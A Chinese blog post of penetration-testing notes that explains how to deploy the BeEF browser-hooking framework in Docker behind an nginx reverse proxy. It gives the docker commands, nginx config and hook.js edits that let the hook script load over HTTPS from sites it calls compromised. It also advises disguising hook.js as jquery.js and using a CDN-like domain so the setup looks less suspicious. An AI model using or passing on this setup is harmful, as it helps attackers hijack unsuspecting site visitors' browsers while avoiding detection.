---
layout: post
title: Docker安装BeEF并设置反代
tags: [docker,beef,]
category: [渗透笔记,]
excerpt: 使用Docker安装BeEF并设置反向代理，自定义配置
---

## 安装



参考此处：[BeEF Installation](https://github.com/beefproject/beef/wiki/Installation)



### 配置文件



可能需要修改：



**用于登陆BeEF面板的用户名和密码** ：

```

credentials:
        user:   "beef"
        passwd: "beef"
```

**Hook 脚本的名字和session_name**（hook.js这个名字太敏感了）：

```
        hook_file: "/hook.js"
        hook_session_name: "BEEFHOOK"
```



**WebUI 的路径**：

```
extension:
        admin_ui:
            enable: true
            base_path: "/ui"
```



### docker 部署



按照安装说明中的Docker部分。我们只需要：



1. 修改配置文件

2. 封装docker镜像

3. 启动docker容器



三步即可。



```

docker build -t beef .
docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef beef
```



## 反向代理



如果直接部署，我们可能面临以下问题：



1. beef本身使用http协议，在现代浏览器的安全策略下，如果被侵入站点启用https，则beef的hook脚本无法加载。（虽说可以加证书，但为其单独申请，可能没必要）
2. 暴露beef服务器，显得有些猖狂。
3. 可以使用域名，降低可疑程度。


### 实施



首先，需要修改配置文件。在配置文件中，http -> public 这个参数下，保存beef对外提供服务使用的域名。



```
http:
        public: "www.domain.com"

```



另外，需要配置nginx：



```
server_name www.domain.com;
    location / {
                proxy_pass http://localhost:3000/;
    }

```

写成这样就能使用，如果需要其他配置，可以自己加。



**注意**

这样配置，可能会导致 hook 脚本内的请求地址与实际地址不匹配。需要修改 hook.js ，并绕开beef，单独提供。



修改一，修改下述位置的 `script.src` 为反向代理后的位置：



```
    hookChildFrames: function () {
        // create script object
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = 'https://www.domain.com/hook.js';

```



修改二，修改下述位置的 `beef.net` 部分，按实际情况修改即可：



```

beef.net = {
    host: "www.domain.com",
    port: "443",
    hook: "/hook.js",
    httpproto: "https",
    handler: '/dh',
    chop: 500,
    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
    sid_count: 0,
    cmd_queue: [],

```



修改完后，可以正常使用。



## 优化



1. 可以适当修改 hook.js 的名字，比如改成 jquery.js 啥的。
2. 可以选择适当的域名，比如 cdn.domain.com 啥的。



